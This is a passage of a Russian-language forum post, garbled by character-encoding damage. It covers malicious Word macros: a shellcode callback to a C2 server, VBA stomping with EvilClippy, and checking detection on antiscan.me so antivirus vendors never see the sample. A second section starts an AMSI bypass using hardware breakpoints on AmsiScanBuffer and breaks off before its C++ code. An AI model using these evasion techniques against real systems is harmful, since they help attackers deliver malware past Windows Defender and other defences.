href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2&amp;viewFallbackFrom=powershell-7.1" target="_blank" class="link link--external" rel="noopener">—Ñ—É–Ω–∫—Ü–∏—é add-type</a> –∏–∑ –∞—Ä—Å–µ–Ω–∞–ª–∞ PowerShell.<br />
<br />
–î–µ–ª–æ –≤ —Ç–æ–º, —á—Ç–æ Add-Type —Å–æ–∑–¥–∞–µ—Ç –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –µ–≥–æ –Ω–∞ –¥–∏—Å–∫. –¢–∞–∫–æ–π —Ñ–∞–π–ª ‚Äì —ç—Ç–æ –∞—Ä—Ç–µ—Ñ–∞–∫—Ç, –ø–æ –∫–æ—Ç–æ—Ä–æ–º—É –≤–∏—Ä—É—Å–Ω—ã–π –∞–Ω–∞–ª–∏—Ç–∏–∫ –º–æ–∂–µ—Ç –¥–æ–≥–∞–¥–∞—Ç—å—Å—è, —á—Ç–æ –≤ —Å–∏—Å—Ç–µ–º–µ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —á—Ç–æ‚Äë—Ç–æ –Ω–µ—Ö–æ—Ä–æ—à–µ–µ. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Ç–∞–∫–æ–π —Ñ–∞–π–ª –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–º–µ—á–µ–Ω –∏ –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–º–∏ –¥–≤–∏–∂–∫–∞–º–∏, –∫–æ–≥–¥–∞ –æ–Ω —É–∂–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω –Ω–∞ –¥–∏—Å–∫.<br />
<br />
–í –∏—Ç–æ–≥–µ, —Å–æ–∑–¥–∞–Ω–Ω—ã–π –ë—Ä–µ–Ω–¥–∞–Ω–æ–º –û—Ä—Ç–∏–∑–æ–º —Å–∫—Ä–∏–ø—Ç –ø—Ä–∏–Ω—è–ª —Å–ª–µ–¥—É—é—â–∏–π –≤–∏–¥:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796162478.png"
		data-src="https://osint42.org/attachments/1746796162478-png.324/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796162478-png.324/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796162478.png"
			title="1746796162478.png"
			width="1129" height="601" loading="lazy" />
	</div><br />
<br />
–ü—Ä–∏ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏–∏ —à–µ–ª–ª‚Äë–∫–æ–¥ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –æ–±—Ä–∞—Ç–Ω—ã–π –≤—ã–∑–æ–≤ –∫ —Å–µ—Ä–≤–µ—Ä—É C2, –∞ –∑–∞—Ç–µ–º –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —à–µ–ª–ª‚Äë–∫–æ–¥—É.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="18.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26892%2F18.png&amp;hash=cc70e8bb6bd9db992c8a171b9bf681ad" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../18fc5e.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26892%2F18.png&amp;hash=cc70e8bb6bd9db992c8a171b9bf681ad"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26892/18.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="18.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
<b>–°—Ç–æ–º–ø–∏–Ω–≥ VBA</b><br />
<br />
–û—Å—Ç–∞–µ—Ç—Å—è –ø–æ—Å–ª–µ–¥–Ω–∏–π —ç—Ç–∞–ø ‚Äî —Å—Ç–æ–º–ø–∏–Ω–≥ VBA. –≠—Ç–æ –∞–∫—Ç —É–¥–∞–ª–µ–Ω–∏—è —á–∞—Å—Ç–∏—á–Ω–æ —Å–∂–∞—Ç–æ–π –≤–µ—Ä—Å–∏–∏ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–æ–¥–∞ VBA, —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω–æ–≥–æ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–µ ‚Äì —Ç–∞–∫, —á—Ç–æ –æ—Å—Ç–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–¥. –ö–æ–≥–¥–∞ –¥–æ–∫—É–º–µ–Ω—Ç –æ—Ç–∫—Ä—ã–≤–∞—é—Ç –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ –≤ —Ç–æ–π –∂–µ –≤–µ—Ä—Å–∏–∏ Word, –¥–ª—è –∫–æ—Ç–æ—Ä–æ–π —Å–æ–∑–¥–∞–≤–∞–ª—Å—è —Å–∫—Ä–∏–ø—Ç, –∫–æ–¥ VBA –Ω–µ –∫–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç—Å—è –∑–∞–Ω–æ–≤–æ ‚Äî –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–π –º–∞–∫—Ä–æ—Å VBA.<br />
<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –µ—Å–ª–∏ –Ω–∞–º –∑–∞–±–ª–∞–≥–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –∏–∑–≤–µ—Å—Ç–Ω–æ, —Å –∫–∞–∫–æ–π –≤–µ—Ä—Å–∏–µ–π VBA –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è –Ω–∞—à –º–∞–∫—Ä–æ—Å, –º—ã –º–æ–∂–µ–º —É–¥–∞–ª–∏—Ç—å –∏–∑ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ –∏ –æ—Å—Ç–∞–≤–∏—Ç—å —Ç–æ–ª—å–∫–æ —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–π. –ë–ª–∞–≥–æ–¥–∞—Ä—è —ç—Ç–æ–º—É —Ä–∞–¥–∏–∫–∞–ª—å–Ω–æ —Å—É–∂–∞–µ—Ç—Å—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∞–Ω–∞–ª–∏–∑–∞ –∫–æ–¥–∞ –∏ —Å–Ω–∏–∂–∞–µ—Ç—Å—è –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –µ–≥–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–º.<br />
<br />
–î–ª—è —Ç–∞–∫–æ–π —Ä–∞–±–æ—Ç—ã –æ—Å–æ–±–µ–Ω–Ω–æ —Ö–æ—Ä–æ—à <a href="https://github.com/outflanknl/EvilClippy" target="_blank" class="link link--external" rel="noopener">–∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç EvilClippy</a>, –∫–æ—Ç–æ—Ä—ã–π –¥–∞–∂–µ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–º–µ–Ω–∏—Ç—å –Ω–µ—Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –º–∞–∫—Ä–æ—Å VBA –±–µ–∑–≤—Ä–µ–¥–Ω–æ–π –≤–µ—Ä—Å–∏–µ–π VBA-–∫–æ–¥–∞. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —Ç—ã –º–æ–∂–µ—à—å –∑–∞–º–µ–Ω–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –º–∞–∫—Ä–æ—Å –Ω–∞ –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –ø–∏—à–µ—Ç &quot;Hello World!&quot;.  –ö–æ–≥–¥–∞ –¥–æ–∫—É–º–µ–Ω—Ç –±—É–¥–µ—Ç –æ—Ç–∫—Ä—ã—Ç, –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –º–∞–∫—Ä–æ—Å, –µ—Å–ª–∏ –≤–µ—Ä—Å–∏—è Office ‚Äì –∏–º–µ–Ω–Ω–æ —Ç–∞, –¥–ª—è –∫–æ—Ç–æ—Ä–æ–π –æ–Ω –∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–ª—Å—è. –í—Å–µ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω–æ–µ EvilClippy –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø—Ä–∏ –ø–æ–º–æ—â–∏ –µ–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ –∫–æ–¥–∞, –≤—ã–≥–ª—è–¥—è—â–µ–π –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796177584.png"
		data-src="https://osint42.org/attachments/1746796177584-png.325/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796177584-png.325/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796177584.png"
			title="1746796177584.png"
			width="612" height="57" loading="lazy" />
	</div><br />
<br />
–í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã –≤ –ø–∞–ø–∫–µ —Å –∏—Å—Ö–æ–¥–Ω—ã–º —Ñ–∞–π–ª–æ–º —Å–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤—ã–π –¥–æ–∫—É–º–µ–Ω—Ç, –∫ –∏–º–µ–Ω–∏ –∫–æ—Ç–æ—Ä–æ–≥–æ –¥–æ–±–∞–≤–ª–µ–Ω–∞ —Å—Ç—Ä–æ–∫–∞ _EvilClippy.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="–¢–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç EvilClippy"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26893%2F19.png&amp;hash=ffe4d7639be9f74c525460b5cb4e2daf" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../191b33.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26893%2F19.png&amp;hash=ffe4d7639be9f74c525460b5cb4e2daf"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26893/19.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="–¢–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç EvilClippy"
			title="–¢–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç EvilClippy"
			width="" height="" loading="lazy" />
	</div><br />
<br />
–û–±—Ä–∞—Ç–∏ –≤–Ω–∏–º–∞–Ω–∏–µ, –Ω–∞—Å–∫–æ–ª—å–∫–æ –¥–≤–∞ —ç—Ç–∏—Ö —Ñ–∞–π–ª–∞ –æ—Ç–ª–∏—á–∞—é—Ç—Å—è –ø–æ —Ä–∞–∑–º–µ—Ä—É. –¢–µ–ø–µ—Ä—å –æ—Å—Ç–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –¥–æ–∫—É–º–µ–Ω—Ç –Ω–∞ <a href="http://antiscan.me/" target="_blank" class="link link--external" rel="noopener">antiscan.me</a> –∏ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å, —Å–∫–æ–ª—å–∫–æ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã—Ö –¥–≤–∏–∂–∫–æ–≤ —Ä–∞—Å–ø–æ–∑–Ω–∞—é—Ç –µ–≥–æ –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π. –í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è antiscan.me, –∞ –Ω–µ VirusTotal, –ø–æ—Å–∫–æ–ª—å–∫—É –ø–µ—Ä–≤—ã–π –∏–∑ —ç—Ç–∏—Ö –¥–≤—É—Ö —Å–∞–π—Ç–æ–≤ –Ω–µ –ø–µ—Ä–µ–¥–∞–µ—Ç  –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–º –∫–æ–º–ø–∞–Ω–∏—è–º –¥–ª—è –µ–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ –±–∞–∑—ã —Å–∏–≥–Ω–∞—Ç—É—Ä.<br />
<br />
<b>–í—ã–≤–æ–¥—ã</b><br />
<br />
–ê –≤–æ—Ç –∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç!<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="20.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26894%2F20.png&amp;hash=0b941ce1a68ef6c0d51d7788fcf95e43" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../209b6d.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26894%2F20.png&amp;hash=0b941ce1a68ef6c0d51d7788fcf95e43"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26894/20.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="20.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
–£—Å–∏–ª–∏—è –≤–æ–∑–Ω–∞–≥—Ä–∞–∂–¥–µ–Ω—ã. –£–≥—Ä–æ–∑—É –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏ –≤—Å–µ–≥–æ 5 –∏–∑ 26 –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã—Ö –¥–≤–∏–∂–∫–æ–≤, –∏ –∞–≤—Ç–æ—Ä—É —Å–∫—Ä–∏–ø—Ç–∞ —É–¥–∞–ª–æ—Å—å —É—Å–∫–æ–ª—å–∑–Ω—É—Ç—å –æ—Ç —Å–∞–º—ã—Ö —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã—Ö, —Ç–∞–∫–∏—Ö –∫–∞–∫ Windows Defender, Sophos, Kaspersky –∏ McAfee. –° –ø–æ–º–æ—â—å—é –ø—Ä–∏–º–µ–Ω–µ–Ω–Ω—ã—Ö –∏–º –º–µ—Ç–æ–¥–æ–≤ —Å–∫—Ä–∏–ø—Ç—É —É–¥–∞–ª–æ—Å—å –æ—Ç–∫–ª—é—á–∏—Ç—å AMSI –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π VBA-—Å–∫—Ä–∏–ø—Ç –Ω–∞ –º–∞—à–∏–Ω–µ, –∑–∞—â–∏—â–µ–Ω–Ω–æ–π Windows Defender.</div>
						

							<h2>–û–±—Ö–æ–¥ AMSI –ø—Ä–∏ –ø–æ–º–æ—â–∏ —Ö–∞—Ä–¥–≤–∞—Ä–Ω—ã—Ö —Ç–æ—á–µ–∫ –æ—Å—Ç–∞–Ω–æ–≤–∞</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746796254998.png"
		data-src="https://osint42.org/attachments/1746796254998-png.326/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796254998-png.326/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796254998.png"
			title="1746796254998.png"
			width="1024" height="1024" loading="lazy" />
	</div><br />
<br />
<b>AMSI (Antimalware Scan Interface)</b> ‚Äî —ç—Ç–æ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ–º—ã–π Microsoft, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º –∏ —Å–ª—É–∂–±–∞–º –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–º–∏ —Ä–µ—à–µ–Ω–∏—è–º–∏, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–º–∏ –Ω–∞ —Å–∏—Å—Ç–µ–º–µ. –° AMSI —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ –º–æ–≥—É—Ç –ª—É—á—à–µ –∏–Ω—Ç–µ–≥—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è —Å –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–º–∏ —Ä–µ—à–µ–Ω–∏—è–º–∏ –∏ –æ–±–µ—Å–ø–µ—á–∏–≤–∞—Ç—å –±–æ–ª–µ–µ –≤—ã—Å–æ–∫–∏–π —É—Ä–æ–≤–µ–Ω—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è —Å–≤–æ–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.<br />
<br />
<b>–û–±—Ö–æ–¥ <b>AMSI </b> —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ö–∞—Ä–¥–≤–µ—Ä–Ω—ã—Ö –±—Ä–µ–π–∫–ø–æ–∏–Ω—Ç–æ–≤</b>:<br />
<br />
<b>–•–∞—Ä–¥–≤–µ—Ä–Ω—ã–µ —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞ </b>‚Äî —ç—Ç–æ –º–µ—Ö–∞–Ω–∏–∑–º, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ—Ç–ª–∞–¥—á–∏–∫–∞–º &quot;–æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å&quot; –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø—Ä–∏ –æ–±—Ä–∞—â–µ–Ω–∏–∏ –∫ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–π –æ–±–ª–∞—Å—Ç–∏ –ø–∞–º—è—Ç–∏. –≠—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª–µ–∑–Ω–æ –ø—Ä–∏ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–∏, –∫–∞–∫ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –∏–ª–∏ —Å–∏—Å—Ç–µ–º–∞ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤—É–µ—Ç —Å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏.<br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º –ø–µ—Ä–µ—Ö–≤–∞—Ç–∏—Ç—å —Ñ—É–Ω–∫—Ü–∏—é AmsiScanBuffer –∏ –∏–∑–º–µ–Ω–∏—Ç—å –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–µ –∏—Å–∫–ª—é—á–µ–Ω–∏—è –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é, —Ç–µ–º —Å–∞–º—ã–º –≤ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–µ —Å–∏—Å—Ç–µ–º—ã –±—É–¥—É—Ç –ø–æ–ø–∞–¥–∞—Ç—å –Ω–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è, –∞ –º—É—Å–æ—Ä.)<br />
<br />
<b>AmsiScanBuffer</b> ‚Äî —ç—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è –∏–∑ Antimalware Scan Interface (AMSI) –≤ Windows. AMSI –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º –∏ —Å–µ—Ä–≤–∏—Å–∞–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–º–∏ —Ä–µ—à–µ–Ω–∏—è–º–∏, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–º–∏ –Ω–∞ —Å–∏—Å—Ç–µ–º–µ. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –±—É—Ñ–µ—Ä—ã –¥–∞–Ω–Ω—ã—Ö –Ω–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ, —á—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å, —Å–æ–¥–µ—Ä–∂–∞—Ç –ª–∏ –æ–Ω–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –∏–ª–∏ –¥—Ä—É–≥–∏–µ —É–≥—Ä–æ–∑—ã.<br />
<br />
–§—É–Ω–∫—Ü–∏—è AmsiScanBuffer –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –ø–∞–º—è—Ç–∏. –≠—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª–µ–∑–Ω–æ, –Ω–∞–ø—Ä–∏–º–µ—Ä, –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Ñ–∞–π–ª–æ–≤, —Å–µ—Ç–µ–≤—ã—Ö –ø–∞–∫–µ—Ç–æ–≤ –∏–ª–∏ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –≥–µ–Ω–µ—Ä–∏—Ä—É–µ–º–æ–≥–æ –∫–æ–¥–∞ –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π.<br />
<br />
–ü—Ä–æ—Ç–æ—Ç–∏–ø —Ñ—É–Ω–∫—Ü–∏–∏ –≤—ã–≥–ª—è–¥–∏—Ç –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    const void *buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT *result
);</code></pre>
	</div>
</div><br />
–û–ø–∏—Å–∞–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤:<br />
<ul>
<li data-xf-list-type="ul">amsiContext: –∫–æ–Ω—Ç–µ–∫—Å—Ç AMSI, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª –ø–æ–ª—É—á–µ–Ω –ø—Ä–∏ –≤—ã–∑–æ–≤–µ AmsiInitialize.</li>
<li data-xf-list-type="ul">buffer: —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±—É—Ñ–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π —Å–ª–µ–¥—É–µ—Ç –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å.</li>
<li data-xf-list-type="ul">length: —Ä–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞ –≤ –±–∞–π—Ç–∞—Ö.</li>
<li data-xf-list-type="ul">contentName: –æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ–µ –∏–º—è –∏–ª–∏ –æ–ø–∏—Å–∞–Ω–∏–µ –∫–æ–Ω—Ç–µ–Ω—Ç–∞, –∫–æ—Ç–æ—Ä—ã–π —Å–∫–∞–Ω–∏—Ä—É–µ—Ç—Å—è. –≠—Ç–æ –º–æ–∂–µ—Ç –ø–æ–º–æ—á—å –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–º—É —Ä–µ—à–µ–Ω–∏—é –ª—É—á—à–µ –ø–æ–Ω—è—Ç—å, —á—Ç–æ –∏–º–µ–Ω–Ω–æ —Å–∫–∞–Ω–∏—Ä—É–µ—Ç—Å—è.</li>
<li data-xf-list-type="ul">amsiSession: –æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–∞—è —Å–µ—Å—Å–∏—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è; –º–æ–∂–µ—Ç –±—ã—Ç—å NULL.</li>
<li data-xf-list-type="ul">result: —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –≤ –∫–æ—Ç–æ—Ä—É—é –±—É–¥–µ—Ç –∑–∞–ø–∏—Å–∞–Ω —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è.</li>
</ul>–§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∫–æ–¥ HRESULT, –∫–æ—Ç–æ—Ä—ã–π —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —É—Å–ø–µ—à–Ω–æ—Å—Ç—å –æ–ø–µ—Ä–∞—Ü–∏–∏ –∏–ª–∏ –Ω–∞–ª–∏—á–∏–µ –æ—à–∏–±–∫–∏. –ó–Ω–∞—á–µ–Ω–∏–µ, —É–∫–∞–∑–∞–Ω–Ω–æ–µ result, –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è, –Ω–∞–ø—Ä–∏–º–µ—Ä, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –±–µ–∑–æ–ø–∞—Å–Ω—ã–º –∏–ª–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º.<br />
<br />
<b>–í–æ—Ç –±–∞–∑–æ–≤—ã–π –ø—Ä–∏–º–µ—Ä –Ω–∞ C++, –∫–æ—Ç–æ—Ä—ã–π —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Ö–∞—Ä–¥–≤–µ—Ä–Ω—ã–π –±—Ä–µ–π–∫–ø–æ–∏–Ω—Ç –Ω–∞ –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ AmsiScanBuffer:</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C++:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
